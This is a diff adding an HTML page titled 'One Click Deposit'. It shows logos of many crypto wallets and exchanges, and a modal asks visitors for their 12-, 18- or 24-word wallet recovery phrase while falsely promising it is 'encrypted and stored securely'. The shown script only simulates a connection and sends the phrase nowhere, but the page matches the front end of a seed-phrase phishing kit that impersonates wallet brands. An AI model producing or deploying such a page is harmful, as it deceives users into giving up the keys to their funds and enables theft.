@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Connect-wallet</title>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/bootstrap-icons/1.11.1/font/bootstrap-icons.min.css" rel="stylesheet">
+    <style>
+        :root {
+            --bs-primary: #4a90e2;
+            --bs-primary-rgb: 74, 144, 226;
+            --bs-secondary: #00d4aa;
+            --bs-secondary-rgb: 0, 212, 170;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+            background: linear-gradient(135deg, var(--bs-dark) 0%, #1a1a1a 100%);
+            min-height: 100vh;
+        }
+
+        [data-bs-theme="light"] body {
+            background: linear-gradient(135deg, #f8f9fa 0%, #e9ecef 100%);
+        }
+
+        .header-title {
+            font-weight: 300;
+            letter-spacing: -1px;
+            background: linear-gradient(45deg, var(--bs-primary), var(--bs-secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .wallet-card {
+            background: rgba(var(--bs-body-bg-rgb), 0.1);
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(var(--bs-border-color-translucent));
+            transition: all 0.3s ease;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .wallet-card:hover {
+            transform: translateY(-5px);
+            border-color: var(--bs-primary);
+            box-shadow: 0 10px 30px rgba(var(--bs-primary-rgb), 0.3);
+        }
+
+        .wallet-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: linear-gradient(45deg, rgba(var(--bs-primary-rgb), 0.1), rgba(var(--bs-secondary-rgb), 0.05));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        .wallet-card:hover::before {
+            opacity: 1;
+        }
+
+        .wallet-icon {
+            width: 60px;
+            height: 60px;
+            background: rgba(var(--bs-body-bg-rgb), 0.1);
+            position: relative;
+            z-index: 2;
+        }
+
+        .wallet-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+        }
+
+        .wallet-name {
+            position: relative;
+            z-index: 2;
+            font-weight: 500;
+        }
+
+        .modal-content {
+            background: rgba(var(--bs-body-bg-rgb), 0.95);
+            backdrop-filter: blur(20px);
+            border: 1px solid rgba(var(--bs-border-color-translucent));
+        }
+
+        .form-control:focus {
+            border-color: var(--bs-primary);
+            box-shadow: 0 0 0 0.25rem rgba(var(--bs-primary-rgb), 0.25);
+        }
+
+        .btn-primary {
+            background: linear-gradient(45deg, var(--bs-primary), var(--bs-secondary));
+            border: none;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+
+        .btn-primary:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(var(--bs-primary-rgb), 0.4);
+        }
+
+        .theme-toggle {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            z-index: 1050;
+        }
+
+        /* Animation for modal */
+        .modal.fade .modal-dialog {
+            transform: scale(0.8) translateY(-50px);
+        }
+
+        .modal.show .modal-dialog {
+            transform: scale(1) translateY(0);
+        }
+
+        /* Custom scrollbar */
+        ::-webkit-scrollbar {
+            width: 8px;
+        }
+
+        ::-webkit-scrollbar-track {
+            background: rgba(var(--bs-secondary-bg-rgb), 0.1);
+        }
+
+        ::-webkit-scrollbar-thumb {
+            background: var(--bs-primary);
+            border-radius: 4px;
+        }
+
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--bs-secondary);
+        }
+    </style>
+</head>
+<body>
+    <!-- Theme Toggle Button -->
+    <button class="btn btn-outline-secondary theme-toggle rounded-circle" onclick="toggleTheme()" title="Toggle Theme">
+        <i class="bi bi-sun-fill d-none" id="light-icon"></i>
+        <i class="bi bi-moon-fill" id="dark-icon"></i>
+    </button>
+
+    <div class="container py-5">
+        <!-- Header -->
+        <div class="text-center mb-5">
+            <h1 class="display-3 header-title mb-0">One Click Deposit</h1>
+            <p class="lead text-muted mt-2">Connect Your Wallet</p>
+        </div>
+
+        <!-- Wallet Grid -->
+        <div class="row g-4">
+            <!-- Ledger -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Ledger')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/ledger.52e09fe1.jpg" alt="Ledger" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Ledger</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Trust Wallet -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Trust Wallet')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/trust.png" alt="Trust Wallet" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Trust Wallet</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MetaMask -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('MetaMask')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/metamask.9d0bcbd4.png" alt="MetaMask" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">MetaMask</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bybit -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Bybit')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/bybit.png" alt="Bybit" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Bybit</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Binance -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Binance')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/Binance-Logo.wine.png" alt="Binance" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Binance</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Coinbase -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Coinbase')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/coinbase-logo.png" alt="Coinbase" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Coinbase</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Bitget -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Bitget')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/bitget.png" alt="Bitget" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Bitget</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- GridPlus -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('GridPlus')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/gridplus.png" alt="GridPlus" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">GridPlus</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- SafePal -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('SafePal')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/safepal.png" alt="SafePal" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">SafePal</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Zelcore -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Zelcore')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/zelcore.png" alt="Zelcore" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Zelcore</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Walletic -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Walletic')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/walletio.png" alt="Walletic" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Walletic</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TronLink -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('TronLink')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/tronlink.jpg" alt="TronLink" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">TronLink</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- TokenPocket -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('TokenPocket')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/tokenpocket.png" alt="TokenPocket" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">TokenPocket</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Atomic -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Atomic')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/atomic.png" alt="Atomic" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Atomic</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- MyKey -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('MyKey')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/mykey.png" alt="MyKey" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">MyKey</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Math Wallet -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Math Wallet')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/math-wallet.png" alt="Math Wallet" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Math Wallet</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- Authereum -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('Authereum')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/authereum.png" alt="Authereum" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">Authereum</h5>
+                    </div>
+                </div>
+            </div>
+
+            <!-- OKX -->
+            <div class="col-lg-3 col-md-4 col-sm-6">
+                <div class="card wallet-card h-100 border-0 rounded-4" data-bs-toggle="modal" data-bs-target="#walletModal" onclick="setWalletType('OKX')">
+                    <div class="card-body text-center p-4">
+                        <div class="wallet-icon rounded-3 mx-auto mb-3 d-flex align-items-center justify-content-center">
+                            <img src="assets/img/okx.png" alt="OKX" class="rounded-3">
+                        </div>
+                        <h5 class="wallet-name card-title mb-0">OKX</h5>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div class="modal fade" id="walletModal" tabindex="-1" aria-labelledby="walletModalLabel" aria-hidden="true">
+        <div class="modal-dialog modal-dialog-centered">
+            <div class="modal-content border-0 rounded-4">
+                <div class="modal-header border-0 pb-2">
+                    <h5 class="modal-title fw-bold" id="walletModalLabel">
+                        <i class="bi bi-wallet2 me-2 text-primary"></i>
+                        <span id="modalWalletName">Wallet</span> Keyphrase
+                    </h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
+                </div>
+                <div class="modal-body px-4 pb-4">
+                    <div class="alert alert-info border-0 rounded-3 mb-4" role="alert">
+                        <i class="bi bi-info-circle me-2"></i>
+                        <strong>Supported keyphrase Length:</strong> 12, 18, or 24 words
+                    </div>
+                    
+                    <form onsubmit="submitKeyphrase(event)">
+                        <div class="mb-4">
+                            <label for="keyphraseInput" class="form-label fw-semibold">
+                                <i class="bi bi-key me-1"></i>
+                                Enter Keyphrase
+                            </label>
+                            <textarea 
+                                class="form-control rounded-3" 
+                                id="keyphraseInput" 
+                                rows="3"
+                                placeholder="Enter your 12, 18, or 24 words keyphrase..."
+                                required
+                            ></textarea>
+                            <div class="form-text">
+                                <i class="bi bi-shield-lock me-1"></i>
+                                Your keyphrase is encrypted and stored securely
+                            </div>
+                        </div>
+                        
+                        <div class="d-grid">
+                            <button type="submit" class="btn btn-primary btn-lg rounded-3">
+                                <i class="bi bi-check-circle me-2"></i>
+                                Connect Wallet
+                            </button>
+                        </div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Bootstrap JS -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
+    
+    <script>
+        let currentWalletType = '';
+
+        // Theme functionality
+        function toggleTheme() {
+            const html = document.documentElement;
+            const currentTheme = html.getAttribute('data-bs-theme');
+            const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
+            
+            html.setAttribute('data-bs-theme', newTheme);
+            
+            // Toggle icons
+            const lightIcon = document.getElementById('light-icon');
+            const darkIcon = document.getElementById('dark-icon');
+            
+            if (newTheme === 'light') {
+                lightIcon.classList.remove('d-none');
+                darkIcon.classList.add('d-none');
+            } else {
+                lightIcon.classList.add('d-none');
+                darkIcon.classList.remove('d-none');
+            }
+            
+            // Store preference (in real app, this would go to a server)
+            console.log('Theme changed to:', newTheme);
+        }
+
+        // Set wallet type when modal opens
+        function setWalletType(walletName) {
+            currentWalletType = walletName;
+            document.getElementById('modalWalletName').textContent = walletName;
+        }
+
+        // Handle form submission
+        function submitKeyphrase(event) {
+            event.preventDefault();
+            
+            const keyphrase = document.getElementById('keyphraseInput').value.trim();
+            
+            if (!keyphrase) {
+                showAlert('Please enter your keyphrase', 'danger');
+                return;
+            }
+
+            // Validate keyphrase length (basic validation)
+            const words = keyphrase.split(/\s+/);
+            if (![12, 18, 24].includes(words.length)) {
+                showAlert('Keyphrase must contain 12, 18, or 24 words', 'warning');
+                return;
+            }
+
+            // Simulate connection process
+            const submitBtn = event.target.querySelector('button[type="submit"]');
+            const originalText = submitBtn.innerHTML;
+            
+            submitBtn.disabled = true;
+            submitBtn.innerHTML = '<span class="spinner-border spinner-border-sm me-2"></span>Connecting...';
+
+            setTimeout(() => {
+                submitBtn.innerHTML = originalText;
+                submitBtn.disabled = false;
+                
+                // Hide modal
+                bootstrap.Modal.getInstance(document.getElementById('walletModal')).hide();
+                
+                // Clear form
+                document.getElementById('keyphraseInput').value = '';
+                
+                // Show success message
+                showAlert(`Successfully connected to ${currentWalletType}!`, 'success');
+                
+            }, 2000);
+        }
+
+        // Show alert function
+        function showAlert(message, type) {
+            const alertDiv = document.createElement('div');
+            alertDiv.className = `alert alert-${type} alert-dismissible fade show position-fixed`;
+            alertDiv.style.cssText = 'top: 20px; right: 20px; z-index: 1060; max-width: 400px;';
+            alertDiv.innerHTML = `
+                ${message}
+                <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
+            `;
+            
+            document.body.appendChild(alertDiv);
+            
+            // Auto dismiss after 5 seconds
+            setTimeout(() => {
+                if (alertDiv.parentNode) {
+                    bootstrap.Alert.getInstance(alertDiv).close();
+                }
+            }, 5000);
+        }
+
+        // Initialize theme on page load
+        document.addEventListener('DOMContentLoaded', function() {
+            const savedTheme = localStorage.getItem('theme') || 'dark';
+            document.documentElement.setAttribute('data-bs-theme', savedTheme);
+            
+            // Set correct icon
+            if (savedTheme === 'light') {
+                document.getElementById('light-icon').classList.remove('d-none');
+                document.getElementById('dark-icon').classList.add('d-none');
+            }
+        });
+
+        // Clear modal form when it's closed
+        document.getElementById('walletModal').addEventListener('hidden.bs.modal', function () {
+            document.getElementById('keyphraseInput').value = '';
+            currentWalletType = '';
+        });
+    </script>
+</body>
+</html>
